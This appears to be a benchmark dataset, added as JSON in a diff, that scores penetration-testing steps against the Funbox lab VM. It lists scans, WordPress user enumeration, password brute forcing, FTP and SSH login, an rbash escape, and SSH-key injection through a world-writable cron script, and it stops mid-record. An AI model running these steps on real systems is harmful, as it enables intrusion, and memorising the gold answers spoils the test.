@@ -1,0 +1,608 @@
+[
+    {
+        "or": [
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Attacker machine on same network as target", "netdiscover tool available"],
+                "contraindications": [],
+                "goal": "Identify the target IP address on the network",
+                "command": "netdiscover -i eth1 -r 192.168.0.0/24",
+                "output": "Currently scanning: Finished!   |   Screen View: Unique Hosts\n23 Captured ARP Req/Rep packets, from 13 hosts.   Total size: 1380\n---------------------------------------------------------------------------------\nIP              At MAC Address      Count     Len   MAC Vendor / Hostname\n---------------------------------------------------------------------------------\n192.168.0.1     60:e3:27:78:80:ba       1     120   TP-LINK TECHNOLOGIES CO., LTD\n192.168.0.10    b0:09:da:0b:2e:62       1      60   Ring Solutions\n192.168.0.103   f8:d1:11:10:35:8b       8     480   TP-LINK TECHNOLOGIES CO., LTD.\n192.168.0.104   04:d9:f5:22:41:4b       1      60   ASUSTek COMPUTER INC.\n192.168.0.108   d8:ce:3a:e7:2a:c9       1      60   Xiaomi Communications Co Ltd\n192.168.0.150   56:d4:f7:3e:b2:a3       2     120   Unknown vendor\n192.168.0.151   08:00:27:5a:ed:0d       1      60   PCS Systemtechnik GmbH",
+                "results": ["Target IP identified as 192.168.0.151", "MAC address matches VirtualBox configuration (08:00:27:5a:ed:0d)"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Attacker machine on same network as target", "nmap tool available"],
+                "contraindications": [],
+                "goal": "Identify the target IP address on the network",
+                "command": "nmap -sn 192.168.0.0/24",
+                "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 17:35 MDT\nNmap scan report for 192.168.0.1\nHost is up (0.0010s latency).\nNmap scan report for 192.168.0.10\nHost is up (0.0020s latency).\nNmap scan report for 192.168.0.103\nHost is up (0.0015s latency).\nNmap scan report for 192.168.0.104\nHost is up (0.0018s latency).\nNmap scan report for 192.168.0.108\nHost is up (0.0012s latency).\nNmap scan report for 192.168.0.150\nHost is up (0.0025s latency).\nNmap scan report for 192.168.0.151\nHost is up (0.00030s latency).\nMAC Address: 08:00:27:5A:ED:0D (Oracle VirtualBox virtual NIC)\nNmap done: 256 IP addresses (7 hosts up) scanned in 2.84 seconds",
+                "results": ["Target IP identified as 192.168.0.151", "MAC address matches VirtualBox configuration (08:00:27:5a:ed:0d)"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Attacker machine on same network as target", "arp-scan tool available"],
+                "contraindications": [],
+                "goal": "Identify the target IP address on the network",
+                "command": "arp-scan -I eth1 192.168.0.0/24",
+                "output": "Interface: eth1, datalink type: EN10MB (Ethernet)\nStarting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.0.1\t60:e3:27:78:80:ba\tTP-LINK TECHNOLOGIES CO., LTD\n192.168.0.10\tb0:09:da:0b:2e:62\tRing Solutions\n192.168.0.103\tf8:d1:11:10:35:8b\tTP-LINK TECHNOLOGIES CO., LTD.\n192.168.0.104\t04:d9:f5:22:41:4b\tASUSTek COMPUTER INC.\n192.168.0.108\td8:ce:3a:e7:2a:c9\tXiaomi Communications Co Ltd\n192.168.0.150\t56:d4:f7:3e:b2:a3\t(Unknown)\n192.168.0.151\t08:00:27:5a:ed:0d\tPCS Systemtechnik GmbH\n\n7 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.9.5: 256 hosts scanned in 1.892 seconds (135.40 hosts/sec). 7 responded",
+                "results": ["Target IP identified as 192.168.0.151", "MAC address matches VirtualBox configuration (08:00:27:5a:ed:0d)"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target IP address known (192.168.0.151)", "nmap tool available"],
+                "contraindications": [],
+                "goal": "Enumerate open ports and services on target system",
+                "command": "nmap -O 192.168.0.151",
+                "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 17:38 MDT\nNmap scan report for 192.168.0.151\nHost is up (0.00030s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE\n21/tcp  open  ftp\n22/tcp  open  ssh\n80/tcp open   http\nMAC Address:  08:00:27:5A:ED:OD (Oracle VirtualBox virtual NIC)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/).\nTCP/IP fingerprint:\n0S:SCAN(V=7.80%E=4%D=8/18%OT=21%CT=1%CU=41051%PV=Y%DS=1%DC=D%G=Y%M=080027%T\nOS:M=5F3C6688%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%II=I\nOS: %TS=A)OPS(01=M5B4ST11NW7%02=M5B4ST11NW7%03=M5B4NNT11NW7%04=M5B4ST11NW7%0\nOS :5=M5B4ST11NW7%06=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6\nOS: =FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=0 0S:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=\n0S:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%\n0S:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1( OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=\nOS: N%T=40%CD=S)\n\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.61 seconds",
+                "results": ["Three open ports discovered: 21/tcp (ftp), 22/tcp (ssh), 80/tcp (http)", "Target is running Oracle VirtualBox virtual NIC"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target IP address known (192.168.0.151)", "nmap tool available"],
+                "contraindications": [],
+                "goal": "Enumerate open ports and services on target system",
+                "command": "nmap -sV -sC -p- 192.168.0.151",
+                "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 17:38 MDT\nNmap scan report for 192.168.0.151\nHost is up (0.00025s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE VERSION\n21/tcp  open  ftp     ProFTPD 1.3.5e\n22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d2:f6:53:1b:8c:48:7d:9e:b7:7e:8e:4c:3a:3d:9f:0e (RSA)\n|   256 a3:46:5c:1d:88:36:b3:93:47:ac:51:78:23:cd:a1:8b (ECDSA)\n|_  256 9c:8c:f7:63:b5:89:5e:3e:23:1e:8c:1f:4f:0e:cd:2e (ED25519)\n80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://funbox.fritz.box/\nMAC Address: 08:00:27:5A:ED:0D (Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.43 seconds",
+                "results": ["Three open ports discovered: 21/tcp (ftp), 22/tcp (ssh), 80/tcp (http)", "Target is running Oracle VirtualBox virtual NIC", "HTTP service redirects to funbox.fritz.box", "ProFTPD 1.3.5e on port 21", "OpenSSH 8.2p1 on port 22", "Apache 2.4.41 on port 80"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target IP address known (192.168.0.151)", "masscan tool available"],
+                "contraindications": [],
+                "goal": "Enumerate open ports and services on target system",
+                "command": "masscan -p1-65535 192.168.0.151 --rate=1000",
+                "output": "Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-18 23:38:15 GMT\n -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth\nInitiating SYN Stealth Scan\nScanning 1 hosts [65535 ports/host]\nDiscovered open port 80/tcp on 192.168.0.151\nDiscovered open port 21/tcp on 192.168.0.151\nDiscovered open port 22/tcp on 192.168.0.151",
+                "results": ["Three open ports discovered: 21/tcp, 22/tcp, 80/tcp", "No service version information available without further enumeration"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Resource Development",
+                "prerequisites": ["HTTP service redirects to funbox.fritz.box", "Write access to /etc/hosts file"],
+                "contraindications": [],
+                "goal": "Configure hostname resolution for accessing the web application",
+                "command": "echo '192.168.0.151   funbox.fritz.box' >> /etc/hosts",
+                "output": "",
+                "results": ["Hostname funbox.fritz.box now resolves to 192.168.0.151", "Web application accessible via hostname"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Resource Development",
+                "prerequisites": ["HTTP service redirects to funbox.fritz.box", "Write access to /etc/hosts file"],
+                "contraindications": [],
+                "goal": "Configure hostname resolution for accessing the web application",
+                "command": "sudo sh -c 'echo \"192.168.0.151   funbox.fritz.box\" >> /etc/hosts'",
+                "output": "",
+                "results": ["Hostname funbox.fritz.box now resolves to 192.168.0.151", "Web application accessible via hostname"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["HTTP service available on 192.168.0.151"],
+                "contraindications": ["HTTP redirects require hostname resolution", "Will result in failed redirects"],
+                "goal": "Configure hostname resolution for accessing the web application",
+                "command": "curl -L http://192.168.0.151",
+                "output": "curl: (47) Maximum (50) redirects followed",
+                "results": [],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Web service accessible at http://funbox.fritz.box", "WordPress installation identified", "wpscan tool available"],
+                "contraindications": [],
+                "goal": "Enumerate WordPress users for potential credential attacks",
+                "command": "wpscan --url http://funbox.fritz.box -e u",
+                "output": "[+] Upload directory has listing enabled: http://funbox.fritz.box/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] admin\n | Found By: Author Posts - Author Pattern (Passive Detection)\n | Confirmed By:\n | Rss Generator (Passive Detection)\n | Wp Json Api (Aggressive Detection)\n |  - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n | Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Login Error Messages (Aggressive Detection)\n\n[+] joe\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)",
+                "results": ["Two WordPress users discovered: admin and joe", "Upload directory has listing enabled but contains nothing useful"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Web service accessible at http://funbox.fritz.box", "WordPress installation identified", "curl tool available"],
+                "contraindications": [],
+                "goal": "Enumerate WordPress users for potential credential attacks",
+                "command": "curl -s http://funbox.fritz.box/index.php/wp-json/wp/v2/users/ | grep -oP '\"slug\":\"\\K[^\"]+' | sort -u",
+                "output": "admin\njoe",
+                "results": ["Two WordPress users discovered: admin and joe"],
+                "optional": false,
+                "gold": false
+            },
+            [
+                {
+                    "tactic": "Reconnaissance",
+                    "prerequisites": ["Web service accessible at http://funbox.fritz.box", "WordPress installation identified"],
+                    "contraindications": [],
+                    "goal": "Enumerate WordPress users for potential credential attacks",
+                    "command": "curl -s http://funbox.fritz.box/ | grep -i 'author'",
+                    "output": "<meta name=\"author\" content=\"admin\" />\n<link rel=\"alternate\" type=\"application/rss+xml\" title=\"Funbox &raquo; Feed\" href=\"http://funbox.fritz.box/index.php/feed/\" />\n<span class=\"author vcard\"><a class=\"url fn n\" href=\"http://funbox.fritz.box/index.php/author/joe/\">joe</a></span>",
+                    "results": ["WordPress users found in HTML: admin and joe"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Reconnaissance",
+                    "prerequisites": ["WordPress users admin and joe identified"],
+                    "contraindications": [],
+                    "goal": "Enumerate WordPress users for potential credential attacks",
+                    "command": "curl -s http://funbox.fritz.box/index.php/author/joe/ | grep 'author'",
+                    "output": "<meta name=\"author\" content=\"joe\" />\n<span class=\"author vcard\"><a class=\"url fn n\" href=\"http://funbox.fritz.box/index.php/author/joe/\">joe</a></span>",
+                    "results": ["Confirmed user joe exists on WordPress site"],
+                    "optional": false,
+                    "gold": false
+                }
+            ]
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Credential Access",
+                "prerequisites": ["WordPress user 'joe' identified", "wpscan tool available", "rockyou.txt wordlist available at /usr/share/wordlists/rockyou.txt"],
+                "contraindications": [],
+                "goal": "Obtain valid credentials for WordPress user joe through password brute force",
+                "command": "wpscan --url http://funbox.fritz.box --passwords /usr/share/wordlists/rockyou.txt --usernames joe",
+                "output": "[!] Valid Combinations Found:\n | Username: joe, Password: 12345",
+                "results": ["Valid credentials obtained: joe:12345"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Credential Access",
+                "prerequisites": ["WordPress user 'joe' identified", "hydra tool available", "rockyou.txt wordlist available at /usr/share/wordlists/rockyou.txt"],
+                "contraindications": [],
+                "goal": "Obtain valid credentials for WordPress user joe through password brute force",
+                "command": "hydra -l joe -P /usr/share/wordlists/rockyou.txt funbox.fritz.box http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect\" -t 30",
+                "output": "Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-18 17:45:22\n[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task\n[DATA] attacking http-post-form://funbox.fritz.box:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect\n[80][http-post-form] host: funbox.fritz.box   login: joe   password: 12345\n1 of 1 target successfully completed, 1 valid password found",
+                "results": ["Valid credentials obtained: joe:12345"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Credential Access",
+                "prerequisites": ["WordPress user 'joe' identified", "Common password list available"],
+                "contraindications": ["Limited password list may not contain the correct password"],
+                "goal": "Obtain valid credentials for WordPress user joe through password brute force",
+                "command": "wpscan --url http://funbox.fritz.box --passwords /usr/share/wordlists/fasttrack.txt --usernames joe",
+                "output": "[!] No Valid Combinations Found.",
+                "results": [],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["FTP service running on target (port 21)", "Valid credentials for user joe (joe:12345)"],
+                "contraindications": [],
+                "goal": "Access FTP service to retrieve user joe's mailbox file",
+                "command": "ftp funbox.fritz.box\nUsername: joe\nPassword: 12345\nls\nget mbox\nquit",
+                "output": "Connected to funbox.fritz.box.\n220 ProFTPD Server (Debian) [::ffff:192.168.0.151]\nName (funbox.fritz.box:rm): joe\n331 Password required for joe Password:\n230 User joe logged in\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful\n150 Opening ASCII mode data connection for file list\n-rW-------  1 joe   joe             998 Jul 18 09:49 mbox\n226 Transfer complete ftp> get mbox\nLocal: mbox remote: mbox\n200 PORT command\nsuccessful\n150 Opening BINARY mode data connection for mbox (998 bytes)\n226 Transfer complete\n998 bytes received in 0.00 secs (1.7026 MB/s) ftp> 221 Goodbye.",
+                "results": ["Successfully logged into FTP as joe", "Retrieved mbox file containing email from root about backup script", "Email confirms joe's weak password (12345)"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["FTP service running on target (port 21)", "Valid credentials for user joe (joe:12345)", "lftp tool available"],
+                "contraindications": [],
+                "goal": "Access FTP service to retrieve user joe's mailbox file",
+                "command": "lftp -u joe,12345 funbox.fritz.box -e 'ls; get mbox; quit'",
+                "output": "-rW-------  1 joe   joe             998 Jul 18 09:49 mbox\n998 bytes transferred\n",
+                "results": ["Successfully logged into FTP as joe", "Retrieved mbox file containing email from root about backup script", "Email confirms joe's weak password (12345)"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["FTP service running on target (port 21)", "Valid credentials for user joe (joe:12345)", "wget tool available"],
+                "contraindications": [],
+                "goal": "Access FTP service to retrieve user joe's mailbox file",
+                "command": "wget --user=joe --password=12345 ftp://funbox.fritz.box/mbox",
+                "output": "--2020-08-18 17:50:12--  ftp://funbox.fritz.box/mbox\n           => 'mbox'\nResolving funbox.fritz.box (funbox.fritz.box)... 192.168.0.151\nConnecting to funbox.fritz.box (funbox.fritz.box)|192.168.0.151|:21... connected.\nLogging in as joe ... Logged in!\n==> SYST ... done.    ==> PWD ... done.\n==> TYPE I ... done.  ==> CWD not needed.\n==> SIZE mbox ... 998\n==> PASV ... done.    ==> RETR mbox ... done.\nLength: 998 (unauthoritative)\n\nmbox                100%[===================>]     998  --.-KB/s    in 0s\n\n2020-08-18 17:50:12 (92.3 MB/s) - 'mbox' saved [998]\n",
+                "results": ["Successfully logged into FTP as joe", "Retrieved mbox file containing email from root about backup script", "Email confirms joe's weak password (12345)"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["SSH service running on target (port 22)", "Valid credentials for user joe (joe:12345)"],
+                "contraindications": [],
+                "goal": "Establish SSH session as user joe for interactive system access",
+                "command": "ssh 192.168.0.151 -l joe",
+                "output": "joe@192.168.0.151's password:\nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Tue 18 Aug 2020 11:53:40 PM UTC\n\n System load:   0.0                 Processes:                  126\n Usage of /:    58.6% of 9.78GB     Users logged in:            0\n Memory usage:  62%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    0%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Sat Jul 18 10:02:39 2020 from 192.168.178.143\njoe@funbox:~$",
+                "results": ["SSH access granted as user joe", "System is Ubuntu 20.04 LTS", "User joe has restricted shell (rbash)"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["SSH service running on target (port 22)", "Valid credentials for user joe (joe:12345)"],
+                "contraindications": [],
+                "goal": "Establish SSH session as user joe for interactive system access",
+                "command": "ssh joe@funbox.fritz.box",
+                "output": "joe@funbox.fritz.box's password:\nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Tue 18 Aug 2020 11:53:40 PM UTC\n\n System load:   0.0                 Processes:                  126\n Usage of /:    58.6% of 9.78GB     Users logged in:            0\n Memory usage:  62%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    0%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Sat Jul 18 10:02:39 2020 from 192.168.178.143\njoe@funbox:~$",
+                "results": ["SSH access granted as user joe", "System is Ubuntu 20.04 LTS", "User joe has restricted shell (rbash)"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["SSH service running on target (port 22)", "Valid credentials for user joe (joe:12345)", "sshpass tool available"],
+                "contraindications": [],
+                "goal": "Establish SSH session as user joe for interactive system access",
+                "command": "sshpass -p '12345' ssh joe@192.168.0.151",
+                "output": "Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Tue 18 Aug 2020 11:53:40 PM UTC\n\n System load:   0.0                 Processes:                  126\n Usage of /:    58.6% of 9.78GB     Users logged in:            0\n Memory usage:  62%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    0%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Sat Jul 18 10:02:39 2020 from 192.168.178.143\njoe@funbox:~$",
+                "results": ["SSH access granted as user joe", "System is Ubuntu 20.04 LTS", "User joe has restricted shell (rbash)"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["SSH session as user joe active", "User joe confined to restricted bash (rbash)", "Python interpreter available on target system"],
+                "contraindications": [],
+                "goal": "Escape restricted shell to gain full bash functionality for system exploration",
+                "command": "python -c \"import pty;pty.spawn('/bin/bash')\"",
+                "output": "joe@funbox:~$",
+                "results": ["Successfully escaped rbash restriction", "Full bash shell access obtained", "Can now navigate filesystem freely"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["SSH session as user joe active", "User joe confined to restricted bash (rbash)"],
+                "contraindications": [],
+                "goal": "Escape restricted shell to gain full bash functionality for system exploration",
+                "command": "ssh joe@192.168.0.151 -t \"bash --noprofile\"",
+                "output": "joe@192.168.0.151's password:\njoe@funbox:~$",
+                "results": ["Successfully escaped rbash restriction", "Full bash shell access obtained", "Can now navigate filesystem freely"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["SSH session as user joe active", "User joe confined to restricted bash (rbash)", "vi or vim editor available"],
+                "contraindications": ["vi/vim may not be available in restricted environment"],
+                "goal": "Escape restricted shell to gain full bash functionality for system exploration",
+                "command": "vi\n:set shell=/bin/bash\n:shell",
+                "output": "bash: vi: command not found",
+                "results": [],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Unrestricted shell access as joe", "Knowledge of other user 'funny' from email"],
+                "contraindications": [],
+                "goal": "Enumerate funny user's home directory to discover the backup script referenced in email",
+                "command": "cd /home/funny && ll",
+                "output": "total 47608\ndrwxr-xr-x 3 funny funny     4096 Jul 18 10:02\ndrwxr-xr-x 4 root  root      4096 Jun 19 11:50\n-rwxrwxrwx 1 funny funny       55 Jul 18 10:15 .backup.sh*\n-rw------- 1 funny funny     1462 Jul 18 10:07 .bash_history\n-rw-r--r-- 1 funny funny      220 Feb 25 12:03 .bash_Logout\n-rw-r--r-- 1 funny funny     3771 Feb 25 12:03 .bashrc\ndrwx------ 2 funny funny     4096 Jun 19 10:43 .cache/\n-rw-rw-r-- 1 funny funny 48701440 Aug 19 00:00 html.tar\n-rw-r--r-- 1 funny funny      807 Feb 25 12:03 .profile\n-rw-rw-r-- 1 funny funny      162 Jun 19 14:13 .reminder.sh\n-rw-rw-r-- 1 funny funny       74 Jun 19 12:25 .selected_editor\n-rw-r--r-- 1 funny funny        0 Jun 19 10:44 .sudo_as_admin_successful\n-rw------- 1 funny funny     7791 Jul 18 10:02 .viminfo",
+                "results": ["Discovered .backup.sh script with world-writable permissions (rwxrwxrwx)", "Script owned by user funny", "Recent html.tar file suggests automated backup execution via cron"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Unrestricted shell access as joe", "Knowledge of other user 'funny' from email"],
+                "contraindications": [],
+                "goal": "Enumerate funny user's home directory to discover the backup script referenced in email",
+                "command": "ls -la /home/funny/",
+                "output": "total 47608\ndrwxr-xr-x 3 funny funny     4096 Jul 18 10:02 .\ndrwxr-xr-x 4 root  root      4096 Jun 19 11:50 ..\n-rwxrwxrwx 1 funny funny       55 Jul 18 10:15 .backup.sh\n-rw------- 1 funny funny     1462 Jul 18 10:07 .bash_history\n-rw-r--r-- 1 funny funny      220 Feb 25 12:03 .bash_logout\n-rw-r--r-- 1 funny funny     3771 Feb 25 12:03 .bashrc\ndrwx------ 2 funny funny     4096 Jun 19 10:43 .cache\n-rw-rw-r-- 1 funny funny 48701440 Aug 19 00:00 html.tar\n-rw-r--r-- 1 funny funny      807 Feb 25 12:03 .profile\n-rw-rw-r-- 1 funny funny      162 Jun 19 14:13 .reminder.sh\n-rw-rw-r-- 1 funny funny       74 Jun 19 12:25 .selected_editor\n-rw-r--r-- 1 funny funny        0 Jun 19 10:44 .sudo_as_admin_successful\n-rw------- 1 funny funny     7791 Jul 18 10:02 .viminfo",
+                "results": ["Discovered .backup.sh script with world-writable permissions (rwxrwxrwx)", "Script owned by user funny", "Recent html.tar file suggests automated backup execution via cron"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Unrestricted shell access as joe", "Knowledge of other user 'funny' from email"],
+                "contraindications": [],
+                "goal": "Enumerate funny user's home directory to discover the backup script referenced in email",
+                "command": "find /home/funny -type f -name '*.sh' 2>/dev/null",
+                "output": "/home/funny/.backup.sh\n/home/funny/.reminder.sh",
+                "results": ["Discovered .backup.sh script in funny's home directory", "Also found .reminder.sh script"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Write access to /home/funny/.backup.sh", "SSH key pair generated on attacker machine", "Backup script executed by funny's cron job"],
+                "contraindications": [],
+                "goal": "Gain SSH access as user funny by injecting SSH key into authorized_keys via cron-executed script",
+                "command": "echo '#!/bin/bash\ncd /home/funny; mkdir .ssh; cd .ssh; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... rm@kali\" > authorized_keys\n#tar -cf /home/funny/html.tar/var/www/html' > /home/funny/.backup.sh",
+                "output": "",
+                "results": ["Modified .backup.sh to create .ssh directory in funny's home", "Modified .backup.sh to add attacker's SSH public key to funny's authorized_keys", "Cron job will execute modified script within one minute"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Write access to /home/funny/.backup.sh", "Backup script executed by funny's cron job"],
+                "contraindications": [],
+                "goal": "Gain SSH access as user funny by injecting SSH key into authorized_keys via cron-executed script",
+                "command": "ssh-keygen -t rsa -f /tmp/funnykey -N ''\necho \"#!/bin/bash\" > /home/funny/.backup.sh\necho \"mkdir -p /home/funny/.ssh\" >> /home/funny/.backup.sh\necho \"cat /tmp/funnykey.pub > /home/funny/.ssh/authorized_keys\" >> /home/funny/.backup.sh\necho \"chmod 700 /home/funny/.ssh\" >> /home/funny/.backup.sh\necho \"chmod 600 /home/funny/.ssh/authorized_keys\" >> /home/funny/.backup.sh",
+                "output": "Generating public/private rsa key pair.\nYour identification has been saved in /tmp/funnykey.\nYour public key has been saved in /tmp/funnykey.pub.\nThe key fingerprint is:\nSHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx joe@funbox\nThe key's randomart image is:\n+---[RSA 3072]----+\n|                 |\n|                 |\n+----[SHA256]-----+",
+                "results": ["Generated SSH key pair on target", "Modified .backup.sh to create .ssh directory in funny's home", "Modified .backup.sh to add attacker's SSH public key to funny's authorized_keys", "Cron job will execute modified script within one minute"],
+                "optional": false,
+                "gold": false
+            },
+            [
+                {
+                    "tactic": "Resource Development",
+                    "prerequisites": ["Write access to /home/funny/.backup.sh", "Backup script executed by funny's cron job"],
+                    "contraindications": [],
+                    "goal": "Gain SSH access as user funny by injecting SSH key into authorized_keys via cron-executed script",
+                    "command": "cat > /home/funny/.backup.sh << 'EOF'\n#!/bin/bash\nmkdir -p /home/funny/.ssh\nchmod 700 /home/funny/.ssh\nEOF",
+                    "output": "",
+                    "results": ["Modified .backup.sh to create .ssh directory"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Privilege Escalation",
+                    "prerequisites": [".ssh directory creation configured in backup script", "SSH public key available"],
+                    "contraindications": [],
+                    "goal": "Gain SSH access as user funny by injecting SSH key into authorized_keys via cron-executed script",
+                    "command": "echo 'echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... rm@kali\" > /home/funny/.ssh/authorized_keys' >> /home/funny/.backup.sh",
+                    "output": "",
+                    "results": ["Added SSH public key injection to backup script"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Privilege Escalation",
+                    "prerequisites": ["Modified backup script ready"],
+                    "contraindications": [],
+                    "goal": "Gain SSH access as user funny by injecting SSH key into authorized_keys via cron-executed script",
